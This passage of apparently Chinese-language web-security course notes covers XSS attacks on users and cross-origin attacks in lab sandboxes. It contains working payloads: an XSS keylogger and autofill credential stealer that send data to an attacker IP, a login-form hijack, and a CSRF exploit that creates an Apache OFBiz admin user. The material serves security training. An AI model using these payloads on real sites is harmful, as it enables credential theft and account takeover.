let encodedData = encodeURIComponent(data)

kali@kali:~/xss$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

有时候，攻击应用程序可能并非最佳策略。如果网站用户才是更大的目标，那么攻击用户本身或许更为有效。键盘记录是针对用户的最佳跨站脚本攻击方法之一，因为它极难被用户察觉，却能非常有效地窃取机密信息。

虽然利用 XSS 进行键盘记录存在局限性，但我们可以通过创建事件监听器来记录任何按键操作，不过该监听器只能设置在当前文档中。这意味着如果用户切换到其他标签页或使用其他应用程序，我们将无法拦截他们的按键。但是，如果用户正在输入私信或尝试登录目标网站，我们就可以捕获这些事件。

JavaScript 中用于表示按键事件的事件是*keydown*，它将被传递给*addEventListener*函数。该函数还接受一个回调函数，用于处理每个 keydown 事件。在这个回调函数中，我们会将按下的键发送回服务器。

```bash
kali@kali:~/xss$nano xss.js

kali@kali:~/xss$cat xss.js
function logKey(event){
        fetch("http://192.168.49.51/k?key=" + event.key)
}

document.addEventListener('keydown', logKey);

kali@kali:~/xss$python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

作为安全专家，我们通常建议用户使用密码管理器来存储密码。然而，有些密码管理器会在登录提示出现时自动填充信息，方便用户登录。我们可以利用这一点窃取用户存储在密码管理器中的凭据。在大多数情况下，这种窃取几乎可以瞬间完成，而且不易察觉。

并非所有密码管理器都会自动填充登录提示，但许多浏览器内置的密码管理器（例如Chrome 浏览器中的密码管理器）都会这样做。通常，它们会查找用户名（或电子邮件）输入框以及*type*属性设置为“password”
的输入框的组合 。

作为攻击者，我们可以创建一个类似的表单供浏览器 自动填充，从而窃取凭据并将 其泄露出去。虽然我们可以将 HTML 输入标签添加到脚本有效负载中，但为了保持代码的条理性，我们将所有内容都放在 xss.js 文件中。在这个文件中，我们需要创建用户名和密码输入框。输入框添加到页面后，密码管理器会自动填充已保存的凭据。一段时间后，我们会将输入框的值发送回 Kali 机器。

```bash
kali@kali:~/xss$ nano xss.js

kali@kali:~/xss$ cat xss.js
  1  let body = document.getElementsByTagName("body")[0]
  2
  3  var u = document.createElement("input");
  4  u.type = "text";
  5  u.style.position = "fixed";
  6  //u.style.opacity = "0";
  7
  8  var p = document.createElement("input");
  9  p.type = "password";
 10  p.style.position = "fixed";
 11  //p.style.opacity = "0";
 12
 13  body.append(u)
 14  body.append(p)
 15
 16  setTimeout(function(){ 
 17          fetch("http://192.168.49.51/k?u=" + u.value + "&p=" + p.value)
 18   }, 5000);
 19

kali@kali:~/xss$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...


```

我们首先在第 1 行获取文档的 `body` 元素并将其存入 `body` 变量中。
在第 3 和第 8 行，我们创建了两个元素：`u` 代表用户名输入框，`p` 代表密码输入框。
用户名输入元素的 `type` 属性会被设置为 `text`（第 4 行），密码输入元素的 `type` 属性会被设置为 `password`（第 9 行）。
正如第 5 和第 10 行所示，这两个输入字段会采用固定定位（`fixed` position，目的是确保它们不会破坏应用程序原有的页面布局）。
最后，我们会将这两个输入字段的透明度（`opacity`，第 6 和第 11 行）设置为 0，从而将它们在视觉上彻底隐藏。

不过，为了方便调试，我们现在先将隐藏透明度的代码注释掉。这样一来，我们就能在受害者的浏览器中直观地看到这些被注入的输入框，并在它们被创建并挂载（append）到页面 `body` 之后观察其状态。此时，浏览器的密码管理器应该会自动将保存的凭证填充进这两个框里。

为了验证数据是否成功被窃取，我们在第 16-18 行设置了一个 5 秒的延时（timeout）。5 秒时间一到，脚本就会发起一个包含提取到的用户名和密码值的 GET 请求进行数据外带。

保存好这个脚本文件并确保后端的 HTTP 服务器正在运行后，我们就可以回到 XSS 沙盒中，勾选“使用存储的密码 (Used stored password)”复选框，并触发渲染来执行这个漏洞利用了。

这里还可以进行一些改进。例如，我们可以不在 输入框中立即获取值，而是添加一个*更改*事件监听器，这样只有在值发生变化时才发送数据。 即使密码管理器存在延迟，我们也能捕获凭据 。但是，在这种情况下，这样做没有必要。

鉴于我们拥有对 HTML 文档的完全访问权限，我们可以重写整个页面，随意设置样式并添加任何所需的 HTML 元素。这意味着我们可以强制任何页面看起来像登录页面，但当用户提交凭据时，提交的内容会发送给我们，而不是发送到预期的服务器。凭据重定向是通过将表单提交的位置替换为我们 Kali 的 IP 地址来实现的。

为了使页面尽可能逼真，理想情况下，我们会使用一个现有的登录页面，复制它，然后更改 表单的*action*属性。XSS 沙箱中的搜索应用程序有一个 位于 /login 的登录页面。

![image-20260428212021592](./image/WEB200-2023/image-20260428212021592.png)

虽然我们可以手动扒下这个页面的 HTML 源码，并构造一个 XSS Payload 来直接覆盖/替换原有的页面内容，但更聪明的做法是利用 JavaScript 动态地帮我们抓取这些 HTML。这样一来，我们就能避免把大段臃肿的 HTML 代码硬塞进 JavaScript Payload 中（保持代码的精简）。

如果我们打开 Firefox 的开发者工具来审查（Inspect）这个表单，就会发现当前表单会将数据 POST 提交到 `index.php`（位于 `login` 路径下）。![image-20260428212232935](./image/WEB200-2023/image-20260428212232935.png)

在我们的脚本中，我们需要将 action 属性更改为我们的 KaliIP 地址。我们还需要将 method 更改为“get”。这将指示受害者的浏览器自动将有效载荷添加到 URL 查询中，而不是添加到请求体中，这样我们就更容易在 HTTP 服务器日志中找到它。

```javascript
fetch("login").then(res => res.text().then(data => {
	document.getElementsByTagName("html")[0].innerHTML = data
	document.getElementsByTagName("form")[0].action = "http://192.168.49.51"
	document.getElementsByTagName("form")[0].method = "get"
}))

```

首先，我们将使用 `fetch` 去请求登录页面。`fetch` 会返回一个 JavaScript `Promise` 对象，我们可以通过调用 `.then()` 方法来处理这个响应。

通过传入一个箭头函数 (arrow function)，我们可以调用响应对象中的 `text()` 方法。这个 `text()` 方法允许我们读取输入流（在这个场景下，也就是登录页面的 HTML 源码）。值得注意的是，`text()` 方法返回的同样也是一个 Promise。

我们需要再链式调用一次 `.then()` 并传入另一个箭头函数，把最终提取到的 HTML 源码保存到一个名为 `data` 的变量中。简单总结一下这个过程：我们向 `/login` 发起了一个 HTTP GET 请求，从响应体中提取了纯文本代码，并将其存储到了变量 `data` 里。

拿到源码后，我们就可以把当前正在执行 XSS Payload 的页面的整个 HTML 结构，替换成登录页面的内容。具体做法是：
选中 `<html>` 根元素，然后将其 `innerHTML` 属性直接覆盖为我们刚刚抓取到的登录页 HTML。最后，我们在页面上选取这个新“注入”进来的表单（form），并将其原有的 `action`（提交地址）和 `method`（提交请求方式）属性替换成我们的恶意接收地址。

我们将这些代码保存到 `xss.js` 中，并确保 HTTP 服务器正在运行。接下来，我们回到 Search（搜索）应用程序的 Web 根路径下，并输入我们的 `<script>` Payload 来触发注入漏洞。

最后，我们要在受害者的浏览器中渲染这个漏洞利用页面。在点击“渲染 (Render)”之前，我们要先勾选“盲目输入凭证 (Blindly enter credentials)”设置。这将模拟一个缺乏安全意识、一看到登录框提示就会乖乖输入账号密码的用户。

![image-20260428212820294](./image/WEB200-2023/image-20260428212820294.png)

用户输入密码并提交表单。如果我们查看HTTP日志，就能找到受害者的用户名和密码。

```bash
kali@kali:~/xss$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
172.16.174.1 - - [26/Aug/2021 17:53:12] "GET /xss.js HTTP/1.1" 200 -
172.16.174.1 - - [26/Aug/2021 17:53:21] "GET /?username=gullible&password=IMaybeGullibleButMyPasswordsAreStrong HTTP/1.1" 200 -

```

太棒了！我们成功提取了用户的凭据！

# 5、跨域攻击

在本学习模块中，我们将涵盖以下学习单元：

- 同源策略 (Same-Origin Policy)
- SameSite Cookies
- 跨站请求伪造 (CSRF)
- 案例研究：Apache OFBiz CSRF 漏洞
- 跨源资源共享 (CORS)
- 利用薄弱的 CORS 策略

过去，Web 应用程序通常采用**单体架构 (monolithic)**[65]，将所有数据、资源和内容都集中在单一域名下。尽管现在仍有一些应用沿用这种模式，但许多现代 Web 应用程序都会从多个不同的域名加载数据和资源（例如 JavaScript 库）。当一个域名指示浏览器向另一个不同的域名请求资源时，这种请求就被称为**跨源 (cross-origin)** 或**跨站 (cross-site)** 请求。

在本模块中，我们将探讨两种类型的跨源攻击。这些攻击的目标是已经在目标应用程序上建立认证会话 (authenticated sessions) 的用户，其核心攻击面在于利用浏览器处理 Cookie 的底层机制。

首先，我们将回顾**同源策略 (SOP, Same-Origin Policy)**[66]，以理解它在这些攻击中是如何发挥作用的。我们将要讲解的第一种攻击是**跨站请求伪造 (CSRF)**[67]。由于现代浏览器安全机制的不断完善，CSRF 的利用难度正在日益增加，但深入理解它，将为我们后续攻击配置不当的**跨源资源共享 (CORS)**[68]（即我们将要讨论的第二种攻击）打下极其重要的理论基础。

------

### 5.1 同源策略

本学习单元涵盖以下学习目标：

- 理解什么是“源 (origin)”。
- 理解同源策略的核心逻辑，以及它是如何管控跨源请求的。

在本学习模块的实践环节，我们将使用两个应用程序来演示和学习跨源攻击：

- **CORS 沙盒 (CORS Sandbox)：** 一个集成了 CORS 配置和 Fetch API 交互功能的定制测试环境。
- **Apache OFBiz：** 一款开源的**企业资源计划 (ERP)** 应用程序，我们将利用其存在的 CSRF 漏洞进行实战演练。

**“源 (Origin)”是由协议 (Protocol)、主机名 (Hostname) 和端口号 (Port) 三者组合而成的。** 浏览器强制执行同源策略 (SOP, Same-Origin Policy)，旨在防止一个源越权访问另一个不同源上的资源（如图片、HTML 数据、JSON 等）。

如果没有同源策略，Web 将会变成一个极其危险的法外之地。任何我们访问的恶意网站都可以悄悄读取我们的电子邮件、查看我们的银行余额，甚至能直接窃取我们在其他已登录网站会话中的敏感信息。

换句话说，`megacorpone.com` 可以在自己的页面里放置一个指向 `kali.org` 的链接，但它不能使用代码直接读取 `kali.org` 的 HTML 内容。这听起来可能会让人有些困惑，因为在日常上网时，我们明明看到许多网站都正常加载了来自第三方的图片、脚本和其他资源。

这里的关键点在于：**SOP 的核心目的并不是阻止浏览器“发送”跨源请求，而是阻止 JavaScript 去“读取”跨源请求的响应内容。**

进一步来说，SOP 允许将跨源的图片、IFrame 以及其他资源嵌入（Embed）并渲染到页面上，但会严格拦截 JavaScript 引擎，禁止其访问这些响应的底层数据。

这在防御逻辑上与 Cookie 的 `HttpOnly` 标志非常相似：`HttpOnly` 阻止 JavaScript 读取 Cookie 内容，但依然允许浏览器在发起 HTTP 请求时自动将其携带发送给服务器。

我们可以在沙盒应用程序的 `https://cors-sandbox/fetch` 节点测试这一行为。建议使用 Burp Suite 内置的浏览器来访问，这样我们就能直观地审查该网页在后台生成的所有 HTTP 请求细节了。![image-20260428233248803](./image/WEB200-2023/image-20260428233248803.png)

该应用程序使用 Fetch API 向我们指定的 URL 发起 GET 请求。同时，我们也可以动态地向页面中插入图片。我们将利用该应用向 `https://www.megacorpone.com/` 发起请求，以此来开始实战探索跨源请求。在应用中输入该 URL，然后点击“发送请求 (Send Request)”。

由于目标域名并没有配置 CORS（跨源资源共享）策略，浏览器拦截了前端 JavaScript，禁止其读取响应内容。然而，如果我们切换到 Burp Suite，查看 **HTTP 历史记录 (HTTP history)** 选项卡，就会发现：**浏览器实际上已经成功发出了该请求，并且目标服务器也完整地返回了响应**。

我们必须牢记一个核心概念：**同源策略 (SOP) 仅仅是拦截了 JavaScript 对响应数据的读取权限，但它绝对不会阻止底层网络请求的发出。**

现在，我们来尝试加载一张图片。前面我们提到过，SOP 允许跨源加载图片。但这里有一个极其重要的前置条件：这种跨源豁免权**仅限于 HTML 中的 `<img src="...">` 等标签渲染**。

如果我们试图通过 JavaScript（例如使用 `fetch` 或 `XMLHttpRequest`）去跨域请求同一张图片的数据流，SOP 依然会无情地拦截 JavaScript 获取其响应内容（除非目标服务器通过配置 CORS 明确赋予了读取权限）。

在绝大多数应用程序中，执行敏感操作的请求通常都需要经过身份验证。过去，浏览器在发起任何请求时都会默认携带相关的 Cookie；但随着 Cookie 的 `SameSite` 属性被引入和广泛应用，这一默认行为在近期已经发生了重大改变。

### 5.2 SameSite 站点同源 Cookie

本学习单元涵盖以下学习目标：

- 深入理解跨源请求 (cross-origin requests) 的概念。
- 掌握 `SameSite` 属性及其三种配置模式。

早在 2016 年 `SameSite`属性被首次引入时，Google Chrome 是首个对其提供支持的浏览器，而如今所有主流浏览器均已全面支持该属性。这个属性的核心作用是**指示浏览器在面对跨站 (cross-site) 或跨源请求时，应当如何处理和发送 Cookie**。当一个网站向另一个不同的网站发起请求时，跨站请求就产生了。举例来说，如果 `megacorpone.com` 页面内尝试加载来自 `kali.org` 的图片，浏览器就会将此行为判定为跨站请求。

该属性目前包含三种有效的配置值：

1. **`None`**： 它会指示浏览器在所有相关的请求中都携带并发送该 Cookie，无论请求的来源是哪里，或是以何种方式发起的。需要特别注意的是，现代浏览器（尤其是 Chrome）通常会强制要求：如果 Cookie 设置了 `SameSite=None`，则必须同时为其配置 `Secure` 标志（即仅允许通过 HTTPS 传输），否则该 Cookie 将会被浏览器直接拦截或丢弃。
2. **`Lax`**： 该值会指示浏览器在大多数跨站请求（如跨站的 POST 请求或 AJAX/Fetch 异步请求）中**不**发送该 Cookie。然而，当发生顶层导航（Top-level navigation）时，例如用户在地址栏中手动输入 URL，或者直接点击了一个指向目标网站的普通链接（GET 请求），浏览器则会放行并发送该 Cookie。
3. **`Strict`**： 这是最严格的配置。当设置为该值时，浏览器将**仅在发起请求的域名与 Cookie 所属的域名完全一致（即绝对同站）时**，才会携带该 Cookie。它与 `Lax` 模式最关键的区别在于：即使用户是从第三方网站直接点击链接跳转过来的，浏览器也**绝对不会**发送标记为 `Strict` 的 Cookie。

如果 Web 应用程序在下发 Cookie 时没有显式配置 `SameSite` 标志，那么将由客户端浏览器自行决定默认的处理策略。目前，Google Chrome 会将所有未显式设置有效 `SameSite` 属性的 Cookie 默认视为 **`SameSite=Lax`**。尽管其他主流浏览器厂商已经表态未来会跟进这一默认安全策略，但在某些特定的版本或环境中，它们的行为可能尚未完全统一。

### 5.3 跨站请求伪造（CSRF）

本学习单元涵盖以下学习目标：

- 理解跨站请求伪造的概念。
- 掌握如何识别跨站请求伪造漏洞。
- 掌握如何利用跨站请求伪造漏洞。

本学习单元大约需要 30 分钟完成。

跨站请求伪造（CSRF）曾是 OWASP Top 10 [72] 的常客，但由于现代浏览器引入了新的防御控制机制，加之许多 Web 框架默认内置了 CSRF 防护，该漏洞在 2017 版中被移除 [73]。在 CSRF 漏洞利用中，攻击者通过欺骗手段，诱导用户向其已经建立有效认证会话的网站提交非法请求。

攻击者可以直接对受害者进行钓鱼攻击，或者将恶意内容注入到 Web 应用程序中供受害者加载。无论采用哪种方式，CSRF Payload 都会强制受害者的浏览器（自动携带所有相关的会话 Cookie）向目标 Web 应用发起请求。浏览器的这种默认行为正在发生改变，我们将在后文中详细探讨。除非 Web 应用程序部署了专门的 CSRF 缓解措施，否则它无法区分该请求是用户自愿发起的还是恶意伪造的。最终，Web 应用程序会在受害者的会话上下文中执行该恶意请求。

CSRF 漏洞最危险的特征在于：只要用户处于已认证状态，且浏览器会自动向目标应用发送 Cookie，那么用户访问的**任何**站点都可能成为发起伪造请求的跳板。攻击者可以通过网络钓鱼精准定向特定用户以触发 CSRF，也可以攻陷一个高流量网站，对所有访问该网站的用户发动无差别 CSRF 攻击。此外，用户在日常浏览互联网时，也极易无意间访问到部署了恶意代码的站点。

CSRF 漏洞造成的具体危害取决于目标 Web 应用的业务逻辑。典型的高危场景包括：在银行应用中执行非授权转账、创建新用户（可能包含管理员权限账户），或者修改密码以实现完全的账户劫持 (Account Takeover)。

在 `SameSite` Cookie 策略被广泛采用之前，如果 Web 应用程序没有显式地实施缓解措施，它们默认都会受到 CSRF 攻击的威胁。与其他由代码逻辑缺陷引起的漏洞不同，CSRF 攻击本质上是**利用了浏览器和 Web 应用程序底层的默认信任行为**。因此，防御 CSRF 的责任完全在于应用程序自身的架构设计。这也是为什么我们在探讨发现 CSRF 漏洞的同时，必须同步学习其防御机制。

应用程序防御 CSRF 攻击的核心思路是：要求用户在提交请求时，提供一个额外的、具有唯一性的值，以此证明该请求确实是由用户本人在其合法界面中主动发起的。这个值不能仅仅是一个 Cookie，因为浏览器的机制决定了它会自动将 Cookie 发送到对应的归属域名。

一种业界的标准做法是引入一个令牌 (Token) 或随机数 (Nonce)——通常被称为 **CSRF Token**，并将其作为隐藏的输入字段 (Hidden Input Field) 嵌入到前端表单中。应用程序会为每个页面、每个会话或每个特定用户随机生成这个 Token 值。当接收到请求时，Web 应用程序通过校验该 CSRF Token 的合法性来确认请求的意图。如果 Token 缺失或无效，应用程序将中断并拒绝处理该请求。这种架构要求服务器端必须维护并追踪用户与其对应 CSRF Token 之间的状态关系。

然而，要求服务器持久化记录并校验每一个请求的 CSRF Token 状态，会显著增加系统的性能开销并可能引发架构层面的可用性问题（例如在分布式集群中同步 Session 状态）。为了解决这一痛点，开发人员设计了一些**无状态 (Stateless)** 的替代方案，使服务器无需在后端存储 Token。尽管单纯依赖存储在 Cookie 中的 CSRF Token 并不安全，但如果配合特定的提交流程作为缓解因素，它依然是一种成熟的防御策略。

目前主流的两种无状态防御方案，均要求浏览器以“非默认”的方式提交 Cookie 中的 CSRF Token 值：

1. **Cookie 到请求头 (Cookie-to-Header) 模式：**

   该模式依赖客户端 JavaScript 读取指定的 Cookie 值，并将其显式地作为一个自定义 HTTP 请求头 (Custom Header) 发送给服务器。服务器接收到请求后，对比该请求头中的值与 Cookie 中的值是否一致，若一致则放行。

   - **安全隐患：** 此方案的致命弱点在于它必须允许前端 JavaScript 读取该 Cookie（即不能设置 `HttpOnly` 标志）。一旦目标应用程序存在**跨站脚本 (XSS)** 漏洞，攻击者就可以利用注入的 JavaScript 轻松窃取该 Cookie，从而彻底绕过 CSRF 防护机制。
   - **原理说明：** XSS 漏洞能够降维打击并绕过应用程序的 CSRF 防护，因为由 XSS Payload 发起的所有请求，在浏览器看来都隶属于当前目标域名。这意味着，XSS 触发的请求不被定义为“跨源”或“跨站”，因此它可以毫无阻力地读取 DOM 树中的隐藏表单值，并在请求中携带所有当前域的 Cookie。

2. **双重提交 (Double Submit) 模式：**

   该模式在前端页面中放置一个包含 CSRF Token 值的隐藏表单输入字段 (`<input type="hidden">`)。当表单提交时，服务器会同时接收到包含 Token 的 Cookie 以及表单中的隐藏字段值。服务器只需校验这两个值是否完全匹配即可。

   - **优势：** 这种模式的显著优点是，前端 JavaScript 不需要直接读取包含 CSRF Token 的 Cookie（该 Cookie 可以安全地配置 `HttpOnly` 标志）。此外，服务器无需在数据库或内存中维护 Token 的生成记录，它只需要执行简单的字符串比对，极大地降低了后端的性能负担。

如果我们在审计时发现，应用程序的表单元素既没有实施上述任何一种防御机制（如隐藏的 Token 字段或自定义 Header），也没有正确配置 `SameSite` Cookie 策略，那么该表单极大概率存在 CSRF 漏洞。在实战中，我们应该通过审查浏览器的 HTML 源码，或利用 Burp Suite 拦截并分析 HTTP 请求包，来精准定位这些缺失的防御控制点。

让我们来看下面这个假设的表单示例：

```html
<form action="/user/changePassword" method="post">
    <div class="form-group">
        <label for="password1">Password</label>
        <input type="password" class="form-control" id="password1" name="password1" required>
    </div>
    <div class="form-group">
        <label for="password2">Repeat Password</label>
        <input type="password" class="form-control" id="password2" name="password2" required>
    </div>
    <button type="submit" class="btn btn-primary">Submit</button>
</form>

```

上面的示例表单包含两个输入字段（`password1` 和 `password2`）以及一个提交按钮。理论上讲，这个向 `/user/changePassword` 提交的 POST 请求存在 CSRF 漏洞，因为它没有使用任何 CSRF Token。当然，在实际审计中，我们还需要进一步检查应用程序设置的 Cookie（例如 `SameSite` 属性），以确定该应用是否采用了其他替代方案来缓解 CSRF 风险。需要特别注意的是，如果该 POST 请求在修改密码时强制要求验证用户的“当前密码”，那么这个 CSRF 漏洞将无法被利用，因为攻击者几乎不可能预先知道受害者的原始密码。

在以下代码块中，展示了一个包含 CSRF 防护的表单示例：

```html
<form action="/user/changePassword" method="post">
    <div class="form-group">
        <input type="hidden" name="csrftoken" value="SXQncyBhIHNlY3JldCB0byBldmVyeWJvZHkh" />
        <label for="password1">Password</label>
        <input type="password" class="form-control" id="password1" name="password1" required >
    </div>
    <div class="form-group">
        <label for="password2">Repeat Password</label>
        <input type="password" class="form-control" id="password2" name="password2" required>
    </div>
    <button type="submit" class="btn btn-primary">Submit</button>
</form>

```

此时的 HTML 表单中增加了一个名为 `csrftoken` 的隐藏输入字段 (`<input type="hidden">`)。后端的 Web 应用程序将利用这个值来验证用户是否是主动、有意地提交了该请求。包含此 Token 的输入字段可以被命名为任何名称，但大多数 Web 框架或中间件通常会倾向于在命名中包含 `csrf` 或 `token` 字样。

通常情况下，基于 GET 请求的 CSRF 漏洞更容易被利用，因为有非常多的方法可以隐蔽地触发浏览器发送跨站的 GET 请求。最典型的例子就是将用于执行 CSRF 攻击的 URL 放置在 `<img>`（图片）标签的 `src` 属性中。浏览器在解析页面时，会自动向该 URL 发起 GET 请求去“加载图片”。在 CSRF 攻击中，我们并不关心受害者浏览器能否成功渲染出图片，我们**唯一关心的是：受害者的浏览器是否成功携带了攻击载荷（以及相关的会话 Cookie）发出了这个请求**。如果请求发出，目标应用就会将其当作合法请求并执行对应的后台功能。在这种场景下，攻击者甚至可以利用极其简单的数据注入漏洞，通过植入视觉上完全不可见的 HTML 标签（例如尺寸为 0x0 的图片或隐藏的 iFrame），对所有访问该页面的用户发动持久化的无差别 CSRF 攻击。

相比之下，伪造并发送跨站的 POST 请求要困难得多。我们必须诱导受害者访问一个包含恶意 HTML 表单的特制页面，并利用 JavaScript 监听页面的 `load` 事件，使其在页面加载完成的瞬间自动提交该表单。

此外，使用传统的 HTML 表单发起攻击，在 `Content-Type`（内容类型）和 HTTP 方法的选择上也受到了严格限制。例如，原生的 HTML 表单是无法直接构造并发送 JSON 格式的数据的，标准 HTML 表单仅支持发送 GET 和 POST 请求。

虽然 JavaScript API（如 XMLHttpRequest (XHR) 和 Fetch）可以突破限制，发送带有任意 HTTP 方法（如 PUT、DELETE）和任意内容类型（如 `application/json`）的请求，但在跨源场景下以这种方式使用这些 API 时，浏览器会强制先发送一个**预检请求 (Preflight request)** ，以探测目标服务器是否明确启用了跨源资源共享 (CORS) 策略并允许此类操作。关于 CORS 的详细机制，我们将在后续章节中深入讨论。

### 5.4 案例实战：Apache OFBiz

本学习单元涵盖以下学习目标：

- 在真实的 Web 应用程序中发现 CSRF 漏洞。
- 利用 CSRF 漏洞创建新用户。
- 使用 JavaScript 链式触发多个 CSRF 请求。
- 理解 `SameSite` 属性是如何影响不同类型 CSRF 攻击的。

我们将从基本结构和一些常用变量开始。

```html
<html>
<head>
<script>
  var username = "csrftest2";
  var password = "password";
  var host = "https://ofbiz:8443";
  var create_url = "/webtools/control/createUserLogin";
  var admin_url = "/webtools/control/userLogin_addUserLoginToSecurityGroup";
  var create_params = "enabled=&partyId=&userLoginId=" + username + "&currentPassword=" + password + "&currentPasswordVerify=" + password + "&passwordHint=hint&requirePasswordChange=N&externalAuthId=&securityQuestion=&securityAnswer=";
  var admin_params = "userLoginId=" +username + "&partyId=&groupId=SUPER&fromDate_i18n=&fromDate=&thruDate_i18n=&thruDate=";
</script>
</head>
<body></body>
</html>

```

我们的文件首先在脚本块中声明了几个变量。以这种方式使用变量可以使漏洞利用程序更加模块化，也更容易更新。

接下来，我们将在 script 标签内创建两个函数。第一个函数将发送创建新用户的请求。第二个函数将发送请求，将新用户添加到 SUPER安全组。最后，我们将在 script 代码块的末尾显式调用第一个函数，以便浏览器在加载页面时执行我们的代码。

```html
...
function send_create() { 
  console.log("Creating user..."); 
  fetch(host+create_url, {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body : create_params }
  ).then(function(response) {
    send_admin();
  }); 
}

function send_admin() { 
  console.log("Adding admin role..."); 
  fetch(host+admin_url, {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded' 
    },
    body : admin_params }
  ).then(
    console.log("Should be done...") 
  );
}

send_create();
</script>
...

```

我们使用 Fetch API 以 “no-cors” 模式发送 POST 请求。这种模式会将我们限制为只能使用 “application/x-www-form-urlencoded” 作为内容类型（Content-Type），但这不会对我们的利用造成影响，因为目标应用原生的正常请求使用的就是这个值。

为了确保攻击成功，我们将 `credentials` 属性设置为 “include”，以此来强制指示浏览器在发起请求时必须携带 Cookie。尽管进行了这样的设置，但在某些特定情况下，浏览器仍可能拒绝对外发送 Cookie，这主要取决于被请求域名的 CORS 设置，以及相关 Cookie 本身的 `SameSite` 属性策略。我们将在本学习模块的后续部分深入探讨 CORS 的相关机制。

### 5.5 跨域资源共享（CORS）

本学习单元涵盖以下学习目标：

1. 理解 CORS 的概念
2. 理解 CORS 请求中常见的 HTTP 头
3. 理解 CORS 响应中常见的 HTTP 头

简而言之，CORS 通过 HTTP 响应头向浏览器发出指令，明确指出哪些源（Origins）被允许访问服务器上的资源。它允许 Web 应用程序有意地放宽作用于自身的同源策略（SOP）限制，具体方法是显式指定哪些外部域名可以访问资源，以及允许以何种方式访问这些资源。

请记住，SOP 只是拦截 JavaScript 和浏览器读取跨源资源的响应，但它并不会阻止这些跨源请求的发出。如果 CORS 配置不当，攻击者就可以像利用 CSRF 那样，通过客户端攻击在用户的会话上下文中执行未授权操作。在探讨具体的错误配置之前，我们先来回顾一些 CORS 的基础知识。

在发送实际的跨源请求之前，浏览器通常会使用 HTTP 的 `OPTIONS` 方法向目标地址发起一个**预检请求 (Preflight request)**，以此来确认发起请求的源域名是否被目标服务器允许执行该操作。

```httpp
OPTIONS /foo HTTP/1.1
Host: megacorpone.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Connection: keep-alive
Origin: https://offensive-security.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: X-UserId

```

所有的跨源请求（包括预检请求）都会包含一个 `Origin` 头，其值为发起请求的域名。预检请求还可能包含 `Access-Control-Request-Method` 和 `Access-Control-Request-Headers` 请求头，用于向服务器声明浏览器在后续的实际请求中将会使用的 HTTP 方法和自定义头。服务器接收到预检请求后，将处理这些请求头，并返回其允许的值。

需要注意的是，并非所有的跨源请求都会触发预检机制。某些特定类型的请求被称为**简单请求 (Simple requests)** [80]，通常包括标准的 GET、HEAD 和 POST 请求。然而，如果使用了其他 HTTP 方法（如 PUT、DELETE）、附加了自定义 HTTP 请求头，或者采用了非标准内容类型（Content-Type，如 `application/json`）的 POST 请求，浏览器就会强制发起预检请求。

服务器可以通过设置多个响应头  来启用并控制 CORS 策略。让我们复习一下最常见的几个：

```http
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 23 Jun 2021 17:38:47 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 0
Connection: close
Access-Control-Allow-Methods: GET, POST, OPTIONS
Access-Control-Allow-Origin: https://offensive-security.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Headers: X-UserId
```



1. **`Access-Control-Allow-Origin`**：该头用于指示允许哪些源访问服务器资源。如果该头使用了通配符 (`*`)，则表示允许任何源访问该资源。通常，服务器应当仅对被视为完全公开的资源使用此设置。该头部也可以指定一个单一的具体源。如果应用程序需要允许多个特定源访问，后端逻辑必须根据请求头中的 `Origin` 动态校验并返回相应的域名。
2. **`Access-Control-Allow-Credentials`**：该头指示浏览器是否应该在请求中包含凭证信息（例如 Cookie 或 HTTP 认证头）。此请求头唯一有效的值是 `true`。如果服务器不允许携带凭证，不需要将其设置为 `false`，直接省略该响应头即可。**安全限制：\**如果 Web 应用程序希望将该值设置为 `true`，则它\**绝对不能**在 `Access-Control-Allow-Origin` 头中使用通配符 (`*`)，必须明确指定具体的域名。此外，无论目标服务器的 CORS 策略如何放宽，浏览器始终会强制执行 Cookie 自身的 `SameSite` 属性。换句话说，如果某个 Cookie 配置了 `SameSite=Lax`，即使预检请求表明目标服务器允许携带凭证，浏览器也绝对不会发送该 Cookie。
3. **`Access-Control-Allow-Methods`**：该头指示跨源请求允许使用哪些 HTTP 方法。该头部的值可以包含一个或多个方法，使用逗号分隔。
4. **`Access-Control-Allow-Headers`**：类似地，该头指示跨源请求允许包含哪些自定义 HTTP 头。其值同样为一个或多个请求头名称的逗号分隔列表。浏览器会认为某些特定的头部是安全的（例如标准的 Content-Type），因此默认允许在跨源请求中使用它们 [82]。但是，如果要允许在 CORS 请求中携带身份验证头（`Authorization`）或其他自定义头，服务器必须通过该响应头显式地进行授权。

### 5.6 不安全 CORS 策略漏洞利用

由于 CORS 的核心机制就是放宽同源策略，因此，如果启用了 CORS 的网站在配置上存在任何弱点或错误，都会使其自身和用户暴露在类似 CSRF 的跨站攻击风险之下。我们将回到之前的沙盒应用程序，详细检查这些错误的配置，并探讨它们可能带来的实际攻击场景。

在继续下一节之前，请务必重现上述步骤，以在 Burp Suite 中建立基线请求和响应。

我们知道该应用程序支持 CORS。让我们确定是否可以从外部域访问密钥。如果我们向/code 发送一个没有有效 SessionCookie 的 GET 请求，我们会得到以下响应。

由于我们需要进行身份验证才能获取code，因此我们需要在请求中发送有效的 SessionCookie（会话 Cookie）。如果 CORS 请求的响应中缺失了 `Access-Control-Allow-Credentials` 头，浏览器将不会在跨源请求中携带凭证。此外，如果 `Access-Control-Allow-Origin` 头被设置为通配符 (`*`)，那么即使设置了 `Access-Control-Allow-Credentials` 头，浏览器也会判定该组合不合法并拒绝请求（因为允许携带凭证时，必须明确指定信任的具体域名，绝不能是通配符）。

![image-20260429010749577](./image/WEB200-2023/image-20260429010749577.png)

响应包中包含了我们手动设置的 Origin 值，并且 `Access-Control-Allow-Credentials` 被设置为了 "true"。

